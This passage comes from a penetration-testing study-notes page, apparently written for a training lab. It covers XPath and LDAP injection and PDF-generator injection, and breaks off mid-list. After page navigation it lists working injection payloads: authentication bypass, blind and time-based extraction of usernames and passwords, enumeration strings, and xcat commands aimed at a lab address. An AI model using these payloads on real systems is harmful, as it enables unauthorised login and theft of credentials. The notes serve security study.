+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/sql-injection-fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/sqlmap-essentials/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQLMap Essentials
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/web-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/web-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Fuzzing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cwes-study-notes/web-service-and-api-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Service & API Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Android Application Pentesting
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Android Application Pentesting
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../android-application-pentesting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../android-application-pentesting/android-fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Android Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../android-application-pentesting/android-application-static-analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Android Application Static Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../android-application-pentesting/android-application-dynamic-analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Android Application Dynamic Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tools and Protocols
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Tools and Protocols
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools-and-protocols/curl/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    cURL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools-and-protocols/ftp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ftp
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools-and-protocols/gobuster/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    gobuster
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools-and-protocols/nmap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    nmap
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#xpath-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XPath Injection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XPath Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#queriy-basics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Queriy Basics
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Queriy Basics">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#base-case" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Base Case
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#base-case-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Base Case Examples
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#predicates" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Predicates
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#predicate-operands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Predicate Operands
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wildcards" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Wildcards
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wildcard-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Wildcard Examples
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Unions
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Authentication bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#data-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Data Exfiltration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Data Exfiltration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#time-based-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Time-based Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Commands
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Examples
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ldap-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LDAP Injection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="LDAP Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ldap-authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LDAP - Authentication Bypass
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldap-data-exfiltration-blind-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LDAP - Data Exfiltration &amp; Blind Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pdf-generation-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PDF Generation Vulnerabilities
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PDF Generation Vulnerabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#local-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Local File Inclusion
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Local File Inclusion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#annotations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Annotations
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="injection-attacks">Injection Attacks</h1>
+<h2 id="xpath-injection">XPath Injection</h2>
+<h3 id="queriy-basics">Queriy Basics</h3>
+<h4 id="base-case">Base Case</h4>
+<table>
+<thead>
+<tr>
+<th>Query</th>
+<th>Explanation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>module</td>
+<td>Select all module child nodes of the context node</td>
+</tr>
+<tr>
+<td>/</td>
+<td>Select the document root node</td>
+</tr>
+<tr>
+<td>//</td>
+<td>Select descendant nodes of the context node</td>
+</tr>
+<tr>
+<td>.</td>
+<td>Select the context node</td>
+</tr>
+<tr>
+<td>..</td>
+<td>Select the parent node of the context node</td>
+</tr>
+<tr>
+<td>@difficulty</td>
+<td>Select the difficulty attribute node</td>
+</tr>
+<tr>
+<td>text()</td>
+<td>Select all text node child nodes</td>
+</tr>
+</tbody>
+</table>
+<h4 id="base-case-examples">Base Case Examples</h4>
+<table>
+<thead>
+<tr>
+<th>Queries</th>
+<th>Explanation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>/academy_modules/module</td>
+<td>Select all module child nodes of academy_modules node</td>
+</tr>
+<tr>
+<td>//module</td>
+<td>Select all module nodes</td>
+</tr>
+<tr>
+<td>/academy_modules//title</td>
+<td>Select all title nodes that are descendants of the academy_modules node</td>
+</tr>
+<tr>
+<td>/academy_modules/module/tier/@difficulty</td>
+<td>Select the difficulty attribute node of all tier element nodes under the specified path</td>
+</tr>
+<tr>
+<td>//@difficulty</td>
+<td>Select all difficulty attribute nodes</td>
+</tr>
+</tbody>
+</table>
+<h4 id="predicates">Predicates</h4>
+<table>
+<thead>
+<tr>
+<th>Query</th>
+<th>Explanation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>/academy_modules/module[1]</td>
+<td>Select the first module child node of the academy_modules node</td>
+</tr>
+<tr>
+<td>/academy_modules/module[position()=1]</td>
+<td>Equivalent to the above query</td>
+</tr>
+<tr>
+<td>/academy_modules/module[last()]</td>
+<td>Select the last module child node of the academy_modules node</td>
+</tr>
+<tr>
+<td>/academy_modules/module[position()&lt;3]</td>
+<td>Select the first two module child nodes of the academy_modules node</td>
+</tr>
+<tr>
+<td>//module[tier=2]/title</td>
+<td>Select the title of all modules where the tier element node equals 2</td>
+</tr>
+<tr>
+<td>//module/author[@co-author]/../title</td>
+<td>Select the title of all modules where the author element node has a co-author attribute node</td>
+</tr>
+<tr>
+<td>//module/tier[@difficulty="medium"]/..</td>
+<td>Select all modules where the tier element node has a difficulty attribute node set to medium</td>
+</tr>
+</tbody>
+</table>
+<h4 id="predicate-operands">Predicate Operands</h4>
+<table>
+<thead>
+<tr>
+<th>Operand</th>
+<th>Explanation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>+</td>
+<td>Addition</td>
+</tr>
+<tr>
+<td>-</td>
+<td>Subtraction</td>
+</tr>
+<tr>
+<td>*</td>
+<td>Multiplication</td>
+</tr>
+<tr>
+<td>div</td>
+<td>Division</td>
+</tr>
+<tr>
+<td>=</td>
+<td>Equal</td>
+</tr>
+<tr>
+<td>!=</td>
+<td>Not Equal</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td>Less than</td>
+</tr>
+<tr>
+<td>&lt;=</td>
+<td>Less than or Equal</td>
+</tr>
+<tr>
+<td>&gt;</td>
+<td>Greater than</td>
+</tr>
+<tr>
+<td>&gt;=</td>
+<td>Greater than or Equal</td>
+</tr>
+<tr>
+<td>or</td>
+<td>Logical Or</td>
+</tr>
+<tr>
+<td>and</td>
+<td>Logical And</td>
+</tr>
+<tr>
+<td>mod</td>
+<td>Modulus</td>
+</tr>
+</tbody>
+</table>
+<h4 id="wildcards">Wildcards</h4>
+<table>
+<thead>
+<tr>
+<th>Query</th>
+<th>Explanation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>node()</td>
+<td>Matches any node</td>
+</tr>
+<tr>
+<td>*</td>
+<td>Matches any element node</td>
+</tr>
+<tr>
+<td>@*</td>
+<td>Matches any attribute node</td>
+</tr>
+</tbody>
+</table>
+<h4 id="wildcard-examples">Wildcard Examples</h4>
+<table>
+<thead>
+<tr>
+<th>Query</th>
+<th>Explanation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>//*</td>
+<td>Select all element nodes in the document</td>
+</tr>
+<tr>
+<td>//module/author[@*]/..</td>
+<td>Select all modules where the author element node has at least one attribute node of any kind</td>
+</tr>
+<tr>
+<td>/*/*/title</td>
+<td>Select all title nodes that are exactly two levels below the document root</td>
+</tr>
+</tbody>
+</table>
+<h4 id="unions">Unions</h4>
+<table>
+<thead>
+<tr>
+<th>Query</th>
+<th>Explanation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>//module[tier=2]/title/text() | //module[tier=3]/title/text()</td>
+<td>Select the title of all modules in tiers 2 and 3</td>
+</tr>
+</tbody>
+</table>
+<h3 id="authentication-bypass">Authentication bypass</h3>
+<ul>
+<li><code>' or '1'='1</code> in username and password field, returns first user entry, doesn't work when password hashed</li>
+<li><code>' or true() or '</code> in username field, returns first entry, bypasses hashed password</li>
+<li><code>' or position()=n or '</code> in username field, use to enumarate users, returns nth user entry, bypasses password hash</li>
+<li><code>' or contains(.,'admin') or '</code> in username field, returns entries with 'admin' in the name, bypasses password hash</li>
+</ul>
+<h3 id="data-exfiltration">Data Exfiltration</h3>
+<ul>
+<li><code>') or ('1'='1</code> insert into parameters to confirm XPath injection</li>
+<li><code>GET /index.php?q=')+and+('1'='2&amp;f=fullstreetname+|+//text() HTTP/1.1</code> append a new query to return all text nodes</li>
+<li><code>/a/b/c[contains(d/text(), '') or ('1'='1')]/../../..//text()</code> same result as previous but requires knowing the schema depth</li>
+</ul>
+<h4 id="enumeration">Enumeration</h4>
+<ul>
+<li><code>?q=')+and+('1'='2&amp;f=fullstreetname+|+/*[1]</code> used to chack query depth, nothing returned from original query, incrementally append further <code>/*[1]</code> until responses change &gt; correct result &gt; no result, correct result is the depth of path 1,1,1,1 (1,2,1,1,1,1 could have a deeper path etc).</li>
+<li>Once depth known can start enumerating through records, again when no result recieved the previous was the last entry<ul>
+<li><code>|+/*[1]+/*[1]+/*[1]+/*[1]</code></li>
+<li><code>|+/*[1]+/*[1]+/*[1]+/*[2]</code></li>
+<li><code>|+/*[1]+/*[1]+/*[1]+/*[2]</code></li>
+<li><code>|+/*[1]+/*[1]+/*[1]+/*[4]</code></li>
+</ul>
+</li>
+<li>and so on<ul>
+<li><code>|+/*[1]+/*[1]+/*[2]+/*[1]</code></li>
+<li><code>|+/*[1]+/*[1]+/*[2]+/*[2]</code></li>
+<li><code>|+/*[1]+/*[1]+/*[2]+/*[2]</code></li>
+<li><code>|+/*[1]+/*[1]+/*[2]+/*[4]</code></li>
+</ul>
+</li>
+<li><code>q: ') and (position()&gt;0) and ('1'='1</code>another method using the predicate, see how many data items are returned and increment <code>0</code> by that many to get the next batch and repeat (restricted to the node being quried)</li>
+</ul>
+<h3 id="blind-exploitation">Blind Exploitation</h3>
+<ul>
+<li><code>invalid' or '1'='1</code> used to confirm exploitable if form responds differently for valid and invalid entries</li>
+<li><code>invalid' or string-length(name(/*[1]))=n and '1'='1</code> check if the length of the root element node's name is <code>n</code>, if treated as valid then node name length is <code>n</code></li>
+<li><code>invalid' or substring(name(/*[1]),1,1)='a' and '1'='1</code> find the nodes name letter by letter</li>
+<li><code>invalid' or count(/users/*)=n and '1'='1</code> to find the n number of children of the users node</li>
+<li><code>invalid' or string-length(/users/user[1]/username)=n and '1'='1</code> calculate the length <code>n</code> of the username value for the 1st user under the users node</li>
+<li><code>invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1</code> find the value of the first letter of the the first users username</li>
+</ul>
+<h3 id="time-based-exploitation">Time-based Exploitation</h3>
+<ul>
+<li><code>invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1</code> causes time delay if condition is correct by forcing iteration over entire xml document exponentially</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<p><a href="https://github.com/orf/xcat"><strong>xcat</strong></a></p>
+<h4 id="basic-commands">Basic Commands</h4>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>detect</td>
+<td>detect XPath injection and print the type of injection found</td>
+</tr>
+<tr>
+<td>injections</td>
+<td>print all types of injection supported by xcat</td>
+</tr>
+<tr>
+<td>ip</td>
+<td>print the current external IP address</td>
+</tr>
+<tr>
+<td>run</td>
+<td>retrieve the XML document by exploiting the XPath injection</td>
+</tr>
+<tr>
+<td>shell</td>
+<td>xcat shell to run system commands</td>
+</tr>
+</tbody>
+</table>
+<h4 id="examples">Examples</h4>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1">pip3<span class="w"> </span>install<span class="w"> </span>cython
+</span><span id="__span-0-2">pip3<span class="w"> </span>install<span class="w"> </span>xcat
+</span><span id="__span-0-3">xcat<span class="w"> </span>detect<span class="w"> </span>http://172.17.0.2/index.php<span class="w"> </span>q<span class="w"> </span><span class="nv">q</span><span class="o">=</span>BAR<span class="w"> </span><span class="nv">f</span><span class="o">=</span>fullstreetname<span class="w"> </span>--true-string<span class="o">=</span><span class="s1">&#39;!No Result&#39;</span><span class="w"> </span><span class="c1"># get request expecting 2 params q and f</span>
+</span><span id="__span-0-4">xcat<span class="w"> </span>run<span class="w"> </span>http://172.17.0.2/index.php<span class="w"> </span>q<span class="w"> </span><span class="nv">q</span><span class="o">=</span>BAR<span class="w"> </span><span class="nv">f</span><span class="o">=</span>fullstreetname<span class="w"> </span>--true-string<span class="o">=</span><span class="s1">&#39;!No Result&#39;</span>
+</span><span id="__span-0-5">xcat<span class="w"> </span>detect<span class="w"> </span>http://172.17.0.2/index.php<span class="w"> </span>username<span class="w"> </span><span class="nv">username</span><span class="o">=</span>admin<span class="w"> </span>-m<span class="w"> </span>POST<span class="w"> </span>--true-string<span class="o">=</span>successfully<span class="w"> </span>--encode<span class="w"> </span>FORM<span class="w"> </span><span class="c1"># post request will be successful if the username is correct</span>
+</span><span id="__span-0-6">xcat<span class="w"> </span>run<span class="w"> </span>http://172.17.0.2/index.php<span class="w"> </span>username<span class="w"> </span><span class="nv">username</span><span class="o">=</span>admin<span class="w"> </span>-m<span class="w"> </span>POST<span class="w"> </span>--true-string<span class="o">=</span>successfully<span class="w"> </span>--encode<span class="w"> </span>FORM
+</span></code></pre></div></td></tr></table></div>
+<h2 id="ldap-injection">LDAP Injection</h2>
+<h3 id="ldap-authentication-bypass">LDAP - Authentication Bypass</h3>
+<p>Try various wildcards
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><span class="o">(</span><span class="p">&amp;</span><span class="o">(</span><span class="nv">uid</span><span class="o">=</span>*<span class="o">)(</span><span class="nv">userPassword</span><span class="o">=</span>*<span class="o">))</span>
+</span><span id="__span-1-2"><span class="o">(</span><span class="p">&amp;</span><span class="o">(</span><span class="nv">uid</span><span class="o">=</span>admin*<span class="o">)(</span><span class="nv">userPassword</span><span class="o">=</span>*<span class="o">))</span>
+</span><span id="__span-1-3"><span class="o">(</span><span class="p">&amp;</span><span class="o">(</span><span class="nv">uid</span><span class="o">=</span>*admin*<span class="o">)(</span><span class="nv">userPassword</span><span class="o">=</span>*<span class="o">))</span>
+</span></code></pre></div></td></tr></table></div></p>
+<p>Try or and
+- <code>(&amp;(uid=admin)(|(&amp;)(userPassword=abc)))</code> 
+- This would be a username of <code>`admin)(|(&amp;</code> and a password of <code>abc)</code></p>
+<h3 id="ldap-data-exfiltration-blind-exploitation">LDAP - Data Exfiltration &amp; Blind Exploitation</h3>
+<ul>
+<li>When a response varies depending on whether a query is valid or not we can extract data by testing diferent chars one by one
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><span class="o">(</span><span class="p">&amp;</span><span class="o">(</span><span class="nv">uid</span><span class="o">=</span>htb-stdnt<span class="o">)(</span><span class="nv">password</span><span class="o">=</span>a*<span class="o">))</span><span class="w"> </span><span class="c1"># invalid</span>
+</span><span id="__span-2-2"><span class="o">(</span><span class="p">&amp;</span><span class="o">(</span><span class="nv">uid</span><span class="o">=</span>htb-stdnt<span class="o">)(</span><span class="nv">password</span><span class="o">=</span>p*<span class="o">))</span><span class="w"> </span><span class="c1"># valid, move onto next and so on</span>
+</span><span id="__span-2-3"><span class="o">(</span><span class="p">&amp;</span><span class="o">(</span><span class="nv">uid</span><span class="o">=</span>htb-stdnt<span class="o">)(</span><span class="nv">password</span><span class="o">=</span>pa*<span class="o">))</span>
+</span><span id="__span-2-4"><span class="o">(</span><span class="p">&amp;</span><span class="o">(</span><span class="nv">uid</span><span class="o">=</span>htb-stdnt<span class="o">)(</span><span class="nv">password</span><span class="o">=</span>p@a*<span class="o">))</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>We can than use the or clause to find other attibutes <strong>NOTE</strong> ldap attributes can be case insensitive
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><span class="o">(</span><span class="p">&amp;</span><span class="o">(</span><span class="nv">uid</span><span class="o">=</span>htb-stdnt<span class="o">)(</span><span class="p">|</span><span class="o">(</span><span class="nv">description</span><span class="o">=</span>a*<span class="o">)(</span><span class="nv">password</span><span class="o">=</span>invalid<span class="o">)))</span>
+</span><span id="__span-3-2"><span class="o">(</span><span class="p">&amp;</span><span class="o">(</span><span class="nv">uid</span><span class="o">=</span>htb-stdnt<span class="o">)(</span><span class="p">|</span><span class="o">(</span><span class="nv">description</span><span class="o">=</span>da*<span class="o">)(</span><span class="nv">password</span><span class="o">=</span>invalid<span class="o">)))</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>In a POST request this might be <code>username=htb-stdnt)(|(description=a*&amp;password=Invalid)</code></li>
+<li>We can also determine valid attributes with the OR clause
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><span class="o">(</span><span class="p">&amp;</span><span class="o">(</span><span class="nv">uid</span><span class="o">=</span>htb-stdnt<span class="o">)(</span><span class="p">|</span><span class="o">(</span><span class="nv">InvalidAttribute</span><span class="o">=</span>*<span class="o">)(</span><span class="nv">password</span><span class="o">=</span>invalid<span class="o">)))</span>
+</span><span id="__span-4-2"><span class="o">(</span><span class="p">&amp;</span><span class="o">(</span><span class="nv">uid</span><span class="o">=</span>htb-stdnt<span class="o">)(</span><span class="p">|</span><span class="o">(</span><span class="nv">ValidAttribute</span><span class="o">=</span>*<span class="o">)(</span><span class="nv">password</span><span class="o">=</span>invalid<span class="o">)))</span>
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h2 id="pdf-generation-vulnerabilities">PDF Generation Vulnerabilities</h2>
+<ul>
+<li><code>exiftool invoice.pdf</code> - use exiftool to gain information about the library used to generate the PDF after downloading from the target</li>
+<li>If we can post to an site and the generate a PDF we can check if the server executes what we post during generation.
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>test1<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span> <span class="cm">&lt;!-- entered into the title field --&gt;</span>
+</span><span id="__span-5-2"><span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>test2<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span> <span class="cm">&lt;!-- entered into the comment field--&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>If one of the tests comes back bold, we know that field is possibly vulnerable</li>
+</ul>
+<h3 id="xss">XSS</h3>
+<ul>
+<li>Next we can test if JS is executed
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;test1&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>Show where generated PDFs are stored with
